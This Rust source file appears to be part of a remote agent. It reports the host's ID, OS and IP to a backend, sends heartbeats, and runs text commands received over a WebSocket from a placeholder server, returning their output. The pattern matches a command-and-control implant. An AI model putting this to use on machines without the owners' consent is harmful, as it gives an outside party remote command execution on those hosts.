use reqwest::Client;
use serde_json::json;
use tungstenite::{connect, Message};
use url::Url;
use crate::agent::{self, SystemInfo};
use crate::commands;

async fn register_agent(client: &Client, backend_url: &str, info: &SystemInfo) -> Result<(), reqwest::Error> {
    client.post(format!("{}/agent/{}/register", backend_url, info.id))
        .json(&json!({
            "id": info.id,
            "os": info.os,
            "ip": info.ip,
            "active": true
        }))
        .send()
        .await?;
    Ok(())
}

async fn send_heartbeat(client: &Client, backend_url: &str, agent_id: u8) -> Result<(), reqwest::Error> {
    client.post(format!("{}/agent/{}/heartbeat", backend_url, agent_id))
        .send()
        .await?;
    Ok(())
}

pub async fn connect_and_listen() -> Result<(), Box<dyn std::error::Error>> {
    let server_url = "wss://your-public-server.com/socket";
    let backend_url = "https://your-backend-server.com"; // Replace with actual backend URL
    let client = Client::new();

    // Register the agent with the backend server
    let system_info = agent::get_system_info().await?;
    register_agent(&client, backend_url, &system_info).await?;

    let (mut socket, _response) = connect(Url::parse(server_url)?).expect("Failed to connect");

    // Main loop to listen for commands from the server
    loop {
        // Send a heartbeat to the server periodically (e.g., every 60 seconds)
        send_heartbeat(&client, backend_url, system_info.id).await?;

        if let Ok(msg) = socket.read_message() {
            if let Message::Text(command) = msg {
                // Handle the command
                if let Some(response) = commands::handle_command(&command) {
                    // Send the command output back to the server
                    socket.write_message(Message::Text(response)).unwrap();
                }
            }
        }
    }
}
